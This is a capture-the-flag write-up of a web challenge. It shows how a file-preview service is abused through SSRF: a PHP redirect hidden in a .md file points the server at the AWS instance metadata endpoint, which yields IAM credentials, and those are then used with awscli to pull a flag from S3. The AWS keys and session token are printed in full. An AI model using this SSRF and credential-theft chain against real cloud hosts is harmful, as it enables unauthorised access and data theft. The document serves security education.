# Online Previewer - 400 points (Web)

*Question:*
```
I deployed this cool website in the cloud that allows you to know if your online documents are available anywhere. You just provide your link, and it will read it for you. Obviously I restricted it to text files, but I still got hacked recently. Would you be able to help me find out how?

ctf-elb-942178366.us-east-1.elb.amazonaws.com

Written by Jules Denardou & Justin Massey, Datadog
```

*Writeup:*

![](images/web400-1.PNG)

We have provided a service, through which we can query any `.pdf` , `.txt` or `.md` extension. First thing, I found interesting was `.md` extension.
There has been numerous time in previous CTFs (for instance: Nuit Du Hack's Mark is falling or Confidence CTF 2017). `.md` extensions are used for Markdown files (Like the current writeup you are reading). It could render `#`, `[]()` etc to name few.
I started investigating that first, and hosted few naughty markdown on my domain, we will call it http://example.com throughout the writeup.

Although I was able to see the content on the site, but rendering didn't worked. Next, logical step was to do a page-source.

```
    <!-- Comment because I need to fix the S3 permissions first
      <img src="https://s3.amazonaws.com/csaw-ctf/header.png" />
    -->
```

Interesting, as I have done S3 buckets takeover in bug bounties before few years. I know that url could also be rewritten as 
http://csaw-ctf.s3.amazonaws.com/

Cute, now we have the content of what files are hosted on that bucket.

```xml
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Name>csaw-ctf</Name>
<Prefix/>
<Marker/>
<MaxKeys>1000</MaxKeys>
<IsTruncated>false</IsTruncated>
<Contents>
<Key>flag</Key>
<LastModified>2018-11-02T19:52:38.000Z</LastModified>
<ETag>"f27ba6a3e60893fe25a47886e1582e56"</ETag>
<Size>36</Size>
<StorageClass>STANDARD</StorageClass>
</Contents>
</ListBucketResult>
```

Now, I fired up my `awscli` and queried it like `aws s3 cp s3://csaw-ctf/flag ./flag`

Throws me [401] permission error. I tried with the correct region which I found using `host` command also used verbose debug output and figured out I lacked the permission to access the flag file.

So, it's not a cake-walk. AWS EC2 has a feature called the [Instance Metadata Service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). This enables any EC2 instance to access a REST API running on `169.254.169.254`, which returns data about the instance itself.
Hence, you would be able to leak stuff like Instance name, ID, credentials, etc.

We obviously had a limited SSRF as of now due to file extension filter. But well, that doesn't stop us from redirecting what file server requests to our web-server to something else.

I created a `.htaccess` in a separate directory

```
AddType application/x-httpd-php .md
```

and restarted the `apache` webserver. What this will do is it will execute markdown .md files as php files. So, I can apparently write some php code into `.md` and it will execute as just like any other php file if it's in same directory as of `.htaccess`

So, my crafted markdown was 

```
<?php
header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/csaw-ctf');
?>
```

Now, we submit our http://example.com/exploit/index.md to their webservice. Woot, we leaked the AWS credentials.

![](images/web400-2.PNG)

```json
{ "Code" : "Success", "LastUpdated" : "2018-11-13T16:19:48Z", "Type" : "AWS-HMAC", "AccessKeyId" : "ASIAS7BJMNVVZRKPTURL", "SecretAccessKey" : "U/SHZlLN6OLQ3AVWgdh2pWZ7lV1FEjKS5nR/wgBC", "Token" : "FQoGZXIvYXdzEOL//////////wEaDOYg2SnsRsw1VaCpSCK3AwYY/Z/TwdhJ9BLPuABqkX0EbzFsrRbChhTfXiEzdoTkLL/i2bEjQTdWjehr2BjiPzD1UhalvvRQqYBX+9sD4qoXmpc7KSCQ3UYZsdTfpRDWzu6KZjUxc8hVLwlHut5kI3d7HIxy3hN9UQkJENGrMRUWDAUbo6evPIHYI7H4gCmUUb7dbAxZGLFK0QCB7pRYiA2ND3Zs68h158Rp5TnLRA+/sH5PAoWctMsavIYt4EPQR3rvzjtvI+IG6uzWJnxi1a+fFZxbTbUTv3OpR/n3b09ZpMjmJxDA1VSzBzA/25/T2aVPMLjnI1LJsAKzQGvY8eyqJBmFAj67llxLXAbHqzVUcrf3jrH1eKP5no2nXsoc9dCXFPPMs3rSLGANk2H+5aYaQzIGWPbnUk4VNWWy3gVqz7+MMxSNi9EwB08dbxmtmEJ+f4gexmqZtGgW+wC9TKhMYhKBqQYNp7o6a7YRCIiJYRCz6K/uBE+J2Lnd4oYEQB/XpWzk4/+2EASIIle1wlHRNXTmKYYd1zCMrphNHtebI81GMAua/AJp9NMfhUZNd67PtPMhXTQ42cmNrm6cp1CsgcGSnpQoxvOr3wU=", "Expiration" : "2018-11-13T22:48:02Z" }
```

Now, it's a cake-walk 

```
dcua@ubuntu:~/.aws$ export AWS_SESSION_TOKEN="FQoGZXIvYXdzEH8aDBRJgAqobBZNonIvaiK3AxU/YAzjrN2zoyIqHN/shiRZZiFGsK/gXDBoOuduCfhaa0NzF+USj3k8XgpC/SZ8D8cGt7mzWbTNRNhTLQxGb1SSJ0wTc2AedvcLpvnWBUquNi3CDm0G9pyZy2GUrUfVTBX4dqnPnKQAHwTh1vxtf/4wHW8T1l0DU8IMTYud8nyzZXmCgYyonLOGa+IW3Vu56nPce5e/iN9jVzV34BFNqJ71N5t8gkpd0t4jwV8fBtb+mRyCT7dNyFdl1jMSb8CtkU/OGzLW/n5qmWRMasEvhNHBWg8+CB5vt8XmJkvAFmkP91Iv3cmqfY7VWuXJ2VvHw3Z8K6uxkW6LV7xmiJRRwuUtrXVf/+KH+TzoNTi0V3sIKb/839MRDnfVd5V/Q7+q6TgSKyUa900EeEDizOTxQZIzRS1fQpjL1s3pwZ4ESqUCmYdLgBH96Swv8y7X9mWRKjPx0MXP4PLLrWrJHq54UqMVwtoun4GEezCJIiq7S5SoLMiIYbPnAqYubaWfvV2YPPnCJ1JUDQkwF42+UJxGGb65jKlz8k7P92w6wn0i2lnkcehGsO6omwkIWBFVSs2Niu1njwjIoU4okpOW3wU="
dcua@ubuntu:~/.aws$ AWS_ACCESS_KEY_ID='ASIAS7BJMNVVYOPYAMR6' AWS_SECRET_ACCESS_KEY='r1gkApbLcHUFY6aWA5ZgKxgSUPWMqM8JVW98RoLc' aws s3 ls s3://csaw-ctf
2018-11-02 12:52:38         36 flag
dcua@ubuntu:~/.aws$ AWS_ACCESS_KEY_ID='ASIAS7BJMNVVYOPYAMR6' AWS_SECRET_ACCESS_KEY='r1gkApbLcHUFY6aWA5ZgKxgSUPWMqM8JVW98RoLc' aws s3 cp s3://csaw-ctf/flag ./flag
download: s3://csaw-ctf/flag to ./flag              
dcua@ubuntu:~/.aws$ cat flag 
flag{SsRF_1s-c0oL_Ag4iN-w1th_cl0uDs}
```


##### flag{SsRF_1s-c0oL_Ag4iN-w1th_cl0uDs}
